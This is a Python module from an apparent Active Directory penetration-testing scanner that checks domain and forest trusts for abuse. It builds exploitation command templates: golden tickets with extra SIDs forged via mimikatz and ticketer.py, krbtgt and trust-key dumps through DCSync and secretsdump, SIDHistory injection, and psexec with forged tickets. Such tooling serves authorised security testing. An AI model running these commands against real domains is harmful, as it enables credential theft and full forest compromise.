"""
Trust Abuse Checker Module

Checks and analyzes possible attacks via trust relationships between domains.

Extended coverage:
- Forest trust attacks (cross-forest compromise)
- SID filtering bypass
- Trust transitivity abuse
- PAM trust abuse (Privileged Access Management)
- Selective authentication bypass
- AD CS cross-forest abuse

MITRE ATT&CK:
- T1134.005: Access Token Manipulation: SID-History Injection
- T1484: Domain Policy Modification
- T1550.003: Use Alternate Authentication Material: Pass the Ticket

References:
- https://adsecurity.org/?p=1640
- https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
"""

from typing import Dict, Any, List, Optional
from ...proto import ScanOptions, DirectoryType
from ..core.directory_detector import DirectoryDetector
from ..core.domain_collector import DomainCollector
from ..enumeration.trust_enumerator import TrustEnumerator
from utils.async_subprocess import run_exec


# =============================================================================
# Forest Trust Attack Patterns
# =============================================================================

FOREST_TRUST_ATTACKS = {
    "sid_filtering_bypass": {
        "description": "Bypass SID filtering to inject privileged SIDs",
        "severity": "critical",
        "mitre": "T1134.005",
        "prerequisites": ["SID filtering disabled", "Bidirectional trust"],
        "exploitation": {
            "mimikatz": "kerberos::golden /user:admin /domain:{source} /sid:{source_sid} /sids:{target_admin_sid} /krbtgt:{krbtgt_hash} /ticket:golden.kirbi",
            "impacket": "ticketer.py -nthash {krbtgt_hash} -domain {source} -domain-sid {source_sid} -extra-sid {target_admin_sid} admin",
        },
    },
    "extra_sids_attack": {
        "description": "Add extra SIDs to Kerberos ticket for cross-forest privilege escalation",
        "severity": "critical",
        "mitre": "T1134.005",
        "prerequisites": ["Forest trust", "Inter-realm trust key"],
        "exploitation": {
            "mimikatz": "kerberos::golden /user:admin /domain:{source} /sid:{source_sid} /sids:{target_ent_admin_sid}-519 /target:{target} /service:krbtgt /rc4:{trust_key} /ticket:cross.kirbi",
        },
    },
    "pam_trust_abuse": {
        "description": "Abuse Privileged Access Management trust for forest compromise",
        "severity": "critical",
        "mitre": "T1550.003",
        "prerequisites": ["PAM trust enabled", "Shadow principal access"],
        "exploitation": {
            "powershell": "Get-ADObject -SearchBase 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC={forest}' -Filter * -Properties member",
        },
    },
    "trust_key_extraction": {
        "description": "Extract inter-realm trust keys for ticket forging",
        "severity": "critical",
        "mitre": "T1003.006",
        "prerequisites": ["Domain Admin", "DCSync rights"],
        "exploitation": {
            "mimikatz": "lsadump::trust /patch",
            "impacket": "secretsdump.py -just-dc-user '{target_trust_account}$' {domain}/{user}:{password}@{dc}",
        },
    },
    "ad_cs_cross_forest": {
        "description": "Abuse AD CS templates across forest trust for privilege escalation",
        "severity": "high",
        "mitre": "T1649",
        "prerequisites": ["AD CS enrolled", "Cross-forest template enrollment"],
        "exploitation": {
            "certify": "Certify.exe find /vulnerable /ca:{target_ca} /domain:{target_domain}",
            "certipy": "certipy find -u {user}@{source} -p {password} -dc-ip {dc} -vulnerable",
        },
    },
    "selective_auth_bypass": {
        "description": "Bypass selective authentication restrictions",
        "severity": "high",
        "mitre": "T1550.003",
        "prerequisites": ["Selective authentication enabled", "Allowed-to-authenticate access"],
        "exploitation": {
            "powershell": "Set-ADObject -Identity 'CN=computer,CN=Computers,DC={domain}' -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=...}",
        },
    },
}

FOREST_TRUST_INDICATORS = {
    "dangerous_trust_attributes": [
        "TRUST_ATTRIBUTE_FOREST_TRANSITIVE",
        "TRUST_ATTRIBUTE_CROSS_ORGANIZATION",
        "TREAT_AS_EXTERNAL",
        "NON_TRANSITIVE",
    ],
    "risky_trust_types": [
        "Forest",
        "External",
        "Realm",
        "CrossForest",
    ],
    "sid_filtering_disabled_indicators": [
        "quarantined",
        "sid_filtering",
        "enablesidhistory",
    ],
}


class TrustAbuseChecker:
    """Checks for trust relationship abuse vulnerabilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.directory_detector = DirectoryDetector(plugin_instance)
        self.domain_collector = DomainCollector(plugin_instance)
        self.trust_enumerator = TrustEnumerator(plugin_instance)
    
    async def check_trust_abuse(self, scan_options: ScanOptions, target_domain: str = None,
                               test_authentication: bool = False) -> Dict[str, Any]:
        """
        Checks and analyzes possible attacks via trust relationships between domains
        
        Args:
            scan_options: Scan parameters
            target_domain: Target domain for checking specific trust (optional)
            test_authentication: Attempt to execute inter-domain authentication (by default False)
            
        Returns:
            Dict[str, Any]: Results of checking attacks via trust relationships
        """
        result = {
            "success": False,
            "source_domain": scan_options.domain_name,
            "trust_relationships": [],
            "trust_paths": [],
            "vulnerable_paths": [],
            "sid_filtering_disabled": [],
            "authentication_tests": [],
            "statistics": {
                "total_trusts": 0,
                "total_paths": 0,
                "vulnerable_trusts": 0,
                "execution_time": 0
            },
            "exploitation_commands": {},
            "errors": []
        }
        
        import time
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not (scan_options.username and (scan_options.password or scan_options.ntlm_hash)):
            result["errors"].append("Credentials not specified")
            return result
        
        try:
            directory_type = await self.directory_detector.determine_type(scan_options)
            
            if directory_type != DirectoryType.ACTIVE_DIRECTORY:
                result["errors"].append("Checking attacks via trust relationships supported only for Active directory")
                return result
            
            domain_info = await self.domain_collector.gather_info(scan_options, directory_type)
            trusts = await self.trust_enumerator.enumerate(scan_options, directory_type)
            
            processed_trusts = []
            
            for trust in trusts:
                trust_info = {
                    "source_domain": trust.source_domain,
                    "target_domain": trust.target_domain,
                    "trust_type": trust.trust_type,
                    "trust_direction": trust.trust_direction,
                    "is_transitive": trust.is_transitive,
                    "trust_attributes": trust.trust_attributes,
                    "sid_filtering_disabled": "Non-Transitive" not in trust.trust_attributes,
                    "selective_authentication": "Selective Authentication" in trust.trust_attributes,
                    "created": trust.created.isoformat() if trust.created else None,
                    "vulnerabilities": []
                }
                
                if trust_info["sid_filtering_disabled"]:
                    trust_info["vulnerabilities"].append({
                        "type": "sid_filtering_disabled",
                        "description": "SID filtering disabled, possible SIDHistory attack",
                        "severity": "high"
                    })
                    
                    result["sid_filtering_disabled"].append({
                        "source_domain": trust.source_domain,
                        "target_domain": trust.target_domain,
                        "trust_direction": trust.trust_direction
                    })
                
                if trust.is_transitive and trust.trust_direction in ["Outbound", "Bidirectional"]:
                    trust_info["vulnerabilities"].append({
                        "type": "transitive_trust",
                        "description": "Transitive trust relationship, possible access to other domains",
                        "severity": "medium"
                    })
                
                if trust.trust_type == "Windows NT" or "NT5" in trust.trust_type:
                    trust_info["vulnerabilities"].append({
                        "type": "legacy_trust_type",
                        "description": f"Outdated trust relationship type: {trust.trust_type}",
                        "severity": "medium"
                    })
                
                processed_trusts.append(trust_info)
            
            result["trust_relationships"] = processed_trusts
            result["statistics"]["total_trusts"] = len(processed_trusts)
            result["statistics"]["vulnerable_trusts"] = len(result["sid_filtering_disabled"])
            
            # Building trust graph relationships
            trust_graph = {}
            
            for trust in trusts:
                if trust.source_domain not in trust_graph:
                    trust_graph[trust.source_domain] = []
                
                if trust.trust_direction in ["Outbound", "Bidirectional"]:
                    trust_graph[trust.source_domain].append({
                        "target": trust.target_domain,
                        "type": trust.trust_type,
                        "direction": trust.trust_direction,
                        "transitive": trust.is_transitive,
                        "sid_filtering_disabled": "Non-Transitive" not in trust.trust_attributes
                    })
                
                if trust.target_domain not in trust_graph:
                    trust_graph[trust.target_domain] = []
                
                if trust.trust_direction in ["Inbound", "Bidirectional"]:
                    trust_graph[trust.target_domain].append({
                        "target": trust.source_domain,
                        "type": trust.trust_type,
                        "direction": "Inbound" if trust.trust_direction == "Outbound" else trust.trust_direction,
                        "transitive": trust.is_transitive,
                        "sid_filtering_disabled": "Non-Transitive" not in trust.trust_attributes
                    })
            
            # Function for searching all paths between domains
            def find_trust_paths(graph, start, end, path=None, visited=None):
                if path is None:
                    path = []
                if visited is None:
                    visited = set()
                
                path = path + [start]
                visited.add(start)
                
                if start == end:
                    return [path]
                
                if start not in graph:
                    return []
                
                paths = []
                for edge in graph[start]:
                    target = edge["target"]
                    if target not in visited:
                        if len(path) <= 1 or edge["transitive"]:
                            new_paths = find_trust_paths(graph, target, end, path, visited.copy())
                            for p in new_paths:
                                paths.append(p)
                
                return paths
            
            all_domains = list(trust_graph.keys())
            trust_paths = []
            
            if target_domain:
                if target_domain in all_domains:
                    paths = find_trust_paths(trust_graph, scan_options.domain_name, target_domain)
                    for path in paths:
                        trust_paths.append({
                            "path": path,
                            "length": len(path),
                            "target": target_domain
                        })
            else:
                for domain in all_domains:
                    if domain != scan_options.domain_name:
                        paths = find_trust_paths(trust_graph, scan_options.domain_name, domain)
                        for path in paths:
                            trust_paths.append({
                                "path": path,
                                "length": len(path),
                                "target": domain
                            })
            
            # Analyzing found paths for vulnerabilities
            vulnerable_paths = []
            
            for path_info in trust_paths:
                path = path_info["path"]
                vulnerabilities = []
                sid_filtering_disabled = True
                
                for i in range(len(path) - 1):
                    source = path[i]
                    target = path[i + 1]
                    
                    trust_step = None
                    for trust in processed_trusts:
                        if trust["source_domain"] == source and trust["target_domain"] == target:
                            trust_step = trust
                            break
                    
                    if trust_step:
                        if not trust_step["sid_filtering_disabled"]:
                            sid_filtering_disabled = False
                        
                        for vuln in trust_step["vulnerabilities"]:
                            if vuln not in vulnerabilities:
                                vulnerabilities.append(vuln)
                
                if sid_filtering_disabled and len(path) > 1:
                    path_info["sid_filtering_disabled"] = True
                    path_info["vulnerabilities"] = vulnerabilities
                    vulnerable_paths.append(path_info)
            
            result["trust_paths"] = trust_paths
            result["vulnerable_paths"] = vulnerable_paths
            result["statistics"]["total_paths"] = len(trust_paths)
            
            # Checking authentication via trust (if requested)
            if test_authentication and vulnerable_paths:
                authentication_tests = []
                
                for path_info in vulnerable_paths[:3]:
                    target_domain_test = path_info["target"]
                    
                    try:
                        ldap_server = None
                        
                        try:
                            rc, out, _ = await run_exec(
                                ["dig", "+short", f"_ldap._tcp.{target_domain_test}", "SRV"],
                                timeout=10,
                            )
                            
                            if rc == 0 and (out or "").strip():
                                line = (out or "").strip().splitlines()[0]
                                parts = line.strip().split()
                                ldap_server = parts[-1][:-1]
                        except Exception:
                            pass
                        
                        if not ldap_server:
                            continue
                        
                        test_upn = f"{scan_options.username}@{scan_options.domain_name}"
                        
                        ldapsearch_cmd = [
                            'ldapsearch', '-x', '-H', f'ldap://{ldap_server}',
                            '-D', test_upn,
                            '-b', f"DC={',DC='.join(target_domain_test.split('.'))}",
                            '-s', 'base',
                            '(objectClass=*)',
                            'defaultNamingContext'
                        ]
                        
                        if scan_options.password:
                            ldapsearch_cmd.extend(['-w', scan_options.password])
                        
                        rc, out, err = await run_exec(ldapsearch_cmd, timeout=30)
                        auth_successful = rc == 0
                        
                        authentication_tests.append({
                            "source_domain": scan_options.domain_name,
                            "target_domain": target_domain_test,
                            "authentication_successful": auth_successful,
                            "path": path_info["path"],
                            "error": err if not auth_successful else None
                        })
                    except Exception as e:
                        authentication_tests.append({
                            "source_domain": scan_options.domain_name,
                            "target_domain": target_domain_test,
                            "authentication_successful": False,
                            "path": path_info["path"],
                            "error": str(e)
                        })
                
                result["authentication_tests"] = authentication_tests
            
            # Forming commands for exploitation
            if result["sid_filtering_disabled"]:
                trust = result["sid_filtering_disabled"][0]
                
                sidhistory_cmd = f"""
    # exploitation disabled filtering SID via trust relationship
    # WARNING: this is only demonstration code!

    # 1. creation user in source domain
    New-ADUser -Name "TrustExploit" -SamAccountName "TrustExploit" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

    # 2. Getting SID of administrator groups of target domain
    $AdminSID = Get-ADGroup -Identity "Domain Admins" -Server "{trust['target_domain']}" | Select-Object -ExpandProperty SID

    # 3. Adding SID to attribute SIDHistory user
    Set-ADUser -Identity "TrustExploit" -Replace @{{'sIDHistory'=$AdminSID.Value}}

    # 4. Authentication in target domain on behalf of this user
    Enter-PSSession -Computername "server.{trust['target_domain']}" -Credential (Get-Credential "TrustExploit@{trust['source_domain']}")
    """
                
                result["exploitation_commands"]["sidhistory_attack"] = sidhistory_cmd
            
            if vulnerable_paths:
                path = vulnerable_paths[0]["path"]
                target = path[-1]
                
                kerberos_cmd = f"""
    # Using inter-domain trust for access to resources

    # 1. Getting TGT for current user
    kinit {scan_options.username}@{scan_options.domain_name.upper()}

    # 2. Access to resources in target domain
    # SMB
    smbclient //server.{target}/SharedFolder -k

    # RDP with Kerberos support 
    xfreerdp /v:server.{target} /u:{scan_options.username}@{scan_options.domain_name} /kerb

    # WinRM with Kerberos support
    winrm get winrm/config -r:https://server.{target}:5986 -auth:kerberos -u:{scan_options.username}@{scan_options.domain_name}

    # or using impacket:
    getTGT.py {scan_options.domain_name}/{scan_options.username}:{scan_options.password or "*PASSWORD*"}
    export KRB5CCNAME=/tmp/ticket.ccache
    smbclient.py -k {target}/Administrator@server.{target}
    """
                
                result["exploitation_commands"]["trust_kerberos"] = kerberos_cmd
            
            multi_level_paths = [p for p in trust_paths if len(p["path"]) > 2]
            if multi_level_paths:
                path = multi_level_paths[0]["path"]
                target = path[-1]
                
                transitive_cmd = f"""
    # exploitation transitive trust via several domains
    # Trust path: {' -> '.join(path)}

    # 1. Getting TGT for source domain
    kinit {scan_options.username}@{scan_options.domain_name.upper()}

    # 2. Request ticket for specific domain in chain
    kvno host/server.{target}

    # 3. Checking obtained tickets
    klist

    # 4. Access to resources specific domain
    smbclient //server.{target}/SharedFolder -k
    """
                
                result["exploitation_commands"]["transitive_trust"] = transitive_cmd
            
            # Forest trust specific attacks
            forest_attacks = await self._check_forest_trust_attacks(
                scan_options, processed_trusts, domain_info
            )
            if forest_attacks:
                result["forest_trust_attacks"] = forest_attacks
                result["exploitation_commands"].update(
                    forest_attacks.get("exploitation_commands", {})
                )
            
            result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"General error: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result
    
    async def _check_forest_trust_attacks(
        self,
        scan_options: ScanOptions,
        trusts: List[Dict[str, Any]],
        domain_info: Dict[str, Any],
    ) -> Dict[str, Any]:
        """
        Check for forest trust specific attack vectors.
        
        Args:
            scan_options: Scan parameters
            trusts: Processed trust relationships
            domain_info: Domain information
            
        Returns:
            Dict with forest trust attack findings
        """
        result = {
            "forest_trusts_found": [],
            "sid_filtering_vulnerabilities": [],
            "pam_trust_vulnerabilities": [],
            "ad_cs_cross_forest": [],
            "exploitation_commands": {},
        }
        
        for trust in trusts:
            trust_type = trust.get("trust_type", "")
            trust_attrs = trust.get("trust_attributes", "")
            
            # Check for forest trusts
            is_forest_trust = any(
                rt in trust_type.lower() 
                for rt in ["forest", "crossforest", "cross-forest"]
            )
            
            if is_forest_trust:
                forest_trust_info = {
                    "source_domain": trust.get("source_domain"),
                    "target_domain": trust.get("target_domain"),
                    "trust_type": trust_type,
                    "direction": trust.get("trust_direction"),
                    "attack_vectors": [],
                }
                
                # Check SID filtering status
                if trust.get("sid_filtering_disabled"):
                    forest_trust_info["attack_vectors"].append({
                        "attack": "sid_filtering_bypass",
                        "severity": FOREST_TRUST_ATTACKS["sid_filtering_bypass"]["severity"],
                        "description": FOREST_TRUST_ATTACKS["sid_filtering_bypass"]["description"],
                        "mitre": FOREST_TRUST_ATTACKS["sid_filtering_bypass"]["mitre"],
                    })
                    
                    result["sid_filtering_vulnerabilities"].append({
                        "trust": f"{trust.get('source_domain')} -> {trust.get('target_domain')}",
                        "exploitable": True,
                        "attack_type": "SIDHistory Injection / Extra SIDs",
                    })
                    
                    # Generate exploitation commands
                    target = trust.get("target_domain")
                    source = trust.get("source_domain")
                    
                    result["exploitation_commands"]["forest_sid_injection"] = f"""
# Forest Trust SID Injection Attack
# Target: {target}
# Source: {source}

# Step 1: Get target forest Enterprise Admins SID
# Enterprise Admins SID format: S-1-5-21-<forest-root-domain-sid>-519

# Step 2: Get KRBTGT hash (requires DCSync)
secretsdump.py {source}/{scan_options.username}:{scan_options.password or "PASSWORD"}@{scan_options.domain_controller or "DC"} -just-dc-user krbtgt

# Step 3: Create golden ticket with extra SID
ticketer.py -nthash <KRBTGT_HASH> -domain {source} -domain-sid <SOURCE_SID> -extra-sid <TARGET_ENTERPRISE_ADMINS_SID> adminuser

# Step 4: Use ticket
export KRB5CCNAME=adminuser.ccache
psexec.py -k -no-pass {target}/Administrator@dc.{target}
"""
                
                # Check for Extra SIDs attack possibility
                if trust.get("is_transitive") and trust.get("trust_direction") in ["Outbound", "Bidirectional"]:
                    forest_trust_info["attack_vectors"].append({
                        "attack": "extra_sids_attack",
                        "severity": FOREST_TRUST_ATTACKS["extra_sids_attack"]["severity"],
                        "description": FOREST_TRUST_ATTACKS["extra_sids_attack"]["description"],
                        "mitre": FOREST_TRUST_ATTACKS["extra_sids_attack"]["mitre"],
                    })
                
                # Check for PAM trust
                if "pam" in trust_attrs.lower() or "privileged" in trust_attrs.lower():
                    forest_trust_info["attack_vectors"].append({
                        "attack": "pam_trust_abuse",
                        "severity": FOREST_TRUST_ATTACKS["pam_trust_abuse"]["severity"],
                        "description": FOREST_TRUST_ATTACKS["pam_trust_abuse"]["description"],
                        "mitre": FOREST_TRUST_ATTACKS["pam_trust_abuse"]["mitre"],
                    })
                    
                    result["pam_trust_vulnerabilities"].append({
                        "trust": f"{trust.get('source_domain')} -> {trust.get('target_domain')}",
                        "pam_enabled": True,
                    })
                    
                    result["exploitation_commands"]["pam_trust_abuse"] = f"""
# PAM Trust Abuse
# Enumerate shadow principals in target forest

# PowerShell (from compromised host)
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC={',DC='.join(target.split('.'))}" -Filter * -Properties member,msDS-ShadowPrincipalSid

# Find shadow principals that map to privileged groups
Get-ADGroup -Filter 'Name -like "*admin*"' -Server {target} | ForEach-Object {{
    Get-ADObject -Filter "msDS-ShadowPrincipalSid -eq '$($_.SID)'" -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC={',DC='.join(source.split('.'))}"
}}
"""
                
                result["forest_trusts_found"].append(forest_trust_info)
        
        # Check for AD CS cross-forest enrollment
        ad_cs_cross_forest = await self._check_ad_cs_cross_forest(scan_options, result["forest_trusts_found"])
        if ad_cs_cross_forest:
            result["ad_cs_cross_forest"] = ad_cs_cross_forest
        
        return result
    
    async def _check_ad_cs_cross_forest(
        self,
        scan_options: ScanOptions,
        forest_trusts: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """
        Check for AD CS cross-forest enrollment vulnerabilities.
        
        Args:
            scan_options: Scan parameters
            forest_trusts: List of forest trust relationships
            
        Returns:
            List of AD CS cross-forest vulnerabilities
        """
        findings = []
        
        for trust in forest_trusts:
            target = trust.get("target_domain")
            
            if not target:
                continue
            
            # Check for cross-forest certificate enrollment
            finding = {
                "target_forest": target,
                "potential_vulnerability": "AD CS Cross-Forest Enrollment",
                "severity": "high",
                "description": "Cross-forest AD CS template enrollment may allow privilege escalation",
                "check_command": f"certipy find -u {scan_options.username}@{scan_options.domain_name} -p '{scan_options.password or 'PASSWORD'}' -dc-ip {scan_options.domain_controller or 'DC'} -target {target}",
                "recommendation": "Audit certificate templates accessible from trusted forests",
            }
            
            findings.append(finding)
        
        return findings
    
    async def check_trust_key_extraction(
        self,
        scan_options: ScanOptions,
    ) -> Dict[str, Any]:
        """
        Check if trust keys can be extracted (requires DCSync).
        
        Args:
            scan_options: Scan parameters
            
        Returns:
            Dict with trust key extraction findings
        """
        result = {
            "can_extract": False,
            "trust_accounts": [],
            "exploitation_commands": {},
            "errors": [],
        }
        
        # This requires DCSync rights
        result["exploitation_commands"]["trust_key_extraction"] = f"""
# Trust Key Extraction (requires DCSync rights)

# Method 1: Mimikatz
mimikatz# lsadump::trust /patch

# Method 2: secretsdump
secretsdump.py {scan_options.domain_name}/{scan_options.username}:{scan_options.password or "PASSWORD"}@{scan_options.domain_controller or "DC"} -just-dc-user '*$'

# Method 3: Extract specific trust account
# Trust accounts are named: <TRUSTED_DOMAIN>$ (e.g., TARGETFOREST$)
secretsdump.py {scan_options.domain_name}/{scan_options.username}:{scan_options.password or "PASSWORD"}@{scan_options.domain_controller or "DC"} -just-dc-user 'TARGETFOREST$'
"""
        
        return result
    
    async def check_selective_authentication_bypass(
        self,
        scan_options: ScanOptions,
        trust_info: Dict[str, Any],
    ) -> Dict[str, Any]:
        """
        Check for selective authentication bypass possibilities.
        
        Args:
            scan_options: Scan parameters
            trust_info: Trust relationship information
            
        Returns:
            Dict with selective authentication bypass findings
        """
        result = {
            "selective_auth_enabled": trust_info.get("selective_authentication", False),
            "bypass_possible": False,
            "allowed_computers": [],
            "exploitation_commands": {},
        }
        
        if result["selective_auth_enabled"]:
            result["exploitation_commands"]["selective_auth_enum"] = f"""
# Enumerate computers with 'Allowed to Authenticate' permission
# These computers can be used to access resources in the trusting domain

# PowerShell
Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' | 
    Where-Object {{ $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' }} |
    Select-Object Name, DNSHostName

# Check specific computer
Get-ADObject -Identity "CN=server,CN=Computers,DC={',DC='.join(trust_info.get('target_domain', '').split('.'))}" -Properties 'Allowed-To-Authenticate'

# Alternative: Check through Active Directory Users and Computers
# Right-click on computer > Properties > Security > 'Allowed to Authenticate'
"""
        
        return result

